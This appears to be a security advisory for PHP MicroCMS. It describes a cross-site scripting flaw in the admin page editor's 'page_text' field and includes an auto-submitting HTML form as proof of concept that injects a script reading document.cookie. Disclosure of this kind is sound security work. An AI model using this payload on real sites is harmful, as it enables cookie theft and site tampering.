Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "index.php?admin=static_pages_edit&pk=home" script to properly sanitize user-supplied input in "page_text" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/index.php?admin=static_pages_edit&pk=home" method="post" name="main">
<input type="hidden" name="pk" value="home">
<input type="hidden" name="page_title" value="Welcome to PHP MicroCMS">
<input type="hidden" name="page_text" value="text<script>alert(document.cookie)</script>">
<input type="hidden" name="subSavePage" value="Save Changes">
</form>
<script>
document.main.submit();
</script>
